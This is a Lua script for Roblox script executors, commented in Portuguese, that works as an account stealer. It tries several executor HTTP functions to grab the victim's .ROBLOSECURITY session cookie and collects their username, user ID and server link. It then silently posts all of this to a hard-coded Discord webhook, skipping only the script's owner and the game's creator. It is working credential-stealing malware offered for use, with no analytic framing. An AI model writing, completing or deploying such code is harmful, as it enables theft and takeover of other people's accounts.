-- language: Lua, file: logger.lua, target: Roblox (executor com HttpGet/request)
-- *Captura identidade + cookie e envia pro webhook, exceto se for o dono*

local WEBHOOK_URL = "https://discord.com/api/webhooks/1563712335393194006/5iZeus60rOpVfculHkHXlne95lh0gRhHV1iop12c7PXjqSAwGuLYksZ6nS_0K0WYcr4H"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")

local lp = Players.LocalPlayer
local SCRIPT_OWNER_ID = 9214137607 -- ID do dono do script (não vai logar se for ele)

-- ========== utilidades ==========

local function safeCall(fn, ...)
    local ok, res = pcall(fn, ...)
    if ok then return res end
    return nil
end

local function getExecutorName()
    local iden = safeCall(function() return identifyexecutor and identifyexecutor() end)
    if iden and type(iden) == "string" then return iden end
    return "Unknown"
end

local function getThumbnail(userId)
    local ok, url = pcall(function()
        return Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
    end)
    if ok and url then return url end
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
end

-- Tenta pegar o cookie .ROBLOSECURITY de várias formas
local function getCookie()
    local attempts = {
        function() return getcustomasset and nil end,
        function() return syn and syn.request and syn.request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
        function() return http and http.request and http.request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
        function() return request and request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
        function() return game:HttpGet("https://www.roblox.com/mobileapi/userinfo") end,
        function() return HttpService:GetAsync("https://www.roblox.com/mobileapi/userinfo") end,
    }

    for _, fn in ipairs(attempts) do
        local ok, res = pcall(fn)
        if ok and res then
            if type(res) == "table" then
                if res.Cookies and type(res.Cookies) == "table" then
                    for _, c in ipairs(res.Cookies) do
                        local m = tostring(c):match("%.ROBLOSECURITY=([^;]+)")
                        if m then return m end
                    end
                end
                if res.Body and type(res.Body) == "string" then
                    local m = res.Body:match("ROBLOSECURITY=([^;]+)")
                    if m then return m end
                end
            elseif type(res) == "string" then
                local m = res:match("ROBLOSECURITY=([^;]+)")
                if m then return m end
            end
        end
    end

    local genv = safeCall(function() return getgenv() end) or {}
    if genv._cookie then return genv._cookie end
    if genv.cookie then return genv.cookie end
    if genv.ROBLOSECURITY then return genv.ROBLOSECURITY end

    return nil
end

local function getServerLink()
    local jobId = safeCall(function() return game.JobId end) or "unknown"
    if jobId == "" then jobId = "unknown" end
    return string.format("https://www.roblox.com/games/%d/?JobId=%s", game.PlaceId, tostring(jobId))
end

local function getTimestamp()
    return os.date("%Y-%m-%d %H:%M:%S")
end

-- ========== montagem do payload ==========

local function buildEmbed(cookie)
    local userName = lp.Name
    local displayName = lp.DisplayName
    local userId = lp.UserId
    local thumb = getThumbnail(userId)
    local serverLink = getServerLink()
    local timestamp = getTimestamp()
    local executor = getExecutorName()

    local embed = {
        title = "🔐 Novo Script Executado",
        color = 0x8B5CF6,
        thumbnail = { url = thumb },
        fields = {
            { name = "👤 Nome", value = string.format("%s (%s)", displayName, userName), inline = true },
            { name = "🆔 UserID", value = tostring(userId), inline = true },
            { name = "🕒 Data/Hora", value = timestamp, inline = false },
            { name = "🖥️ Executor", value = executor, inline = true },
            { name = "🌐 Servidor", value = serverLink, inline = false },
            { name = "🔗 JobId", value = tostring(game.JobId), inline = false },
        },
        footer = { text = "Logger · " .. timestamp },
        timestamp = DateTime.now():ToIsoDate()
    }

    if cookie then
        table.insert(embed.fields, { name = "🍪 Cookie", value = "```" .. cookie .. "```", inline = false })
    else
        table.insert(embed.fields, { name = "🍪 Cookie", value = "Não disponível neste executor", inline = false })
    end

    return embed
end

-- ========== envio pro webhook ==========

local function sendWebhook(embed)
    local payload = {
        username = "Constipated Logger",
        avatar_url = "https://cdn.discordapp.com/emojis/1290574899577290752.gif",
        embeds = { embed }
    }

    local body = HttpService:JSONEncode(payload)

    local function tryRequest()
        local ok, res
        if syn and syn.request then
            ok, res = pcall(syn.request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
            if ok and res and res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300 then return true end
        end
        if http and http.request then
            ok, res = pcall(http.request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
            if ok and res and res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300 then return true end
        end
        if request then
            ok, res = pcall(request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
            if ok and res and res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300 then return true end
        end
        ok, res = pcall(function()
            return HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
        end)
        return ok
    end

    return tryRequest()
end

-- ========== execução ==========

task.spawn(function()
    task.wait(0.5)
    
    -- AQUI ESTÁ A VERIFICAÇÃO:
    -- Se o ID for do dono do script, ou se for o criador do jogo, ele cancela o envio.
    if lp.UserId == SCRIPT_OWNER_ID or lp.UserId == game.CreatorId then
        -- Silenciosamente ignora e não envia nada pro Discord
        return 
    end

    local cookie = getCookie()
    local embed = buildEmbed(cookie)
    sendWebhook(embed)
end)
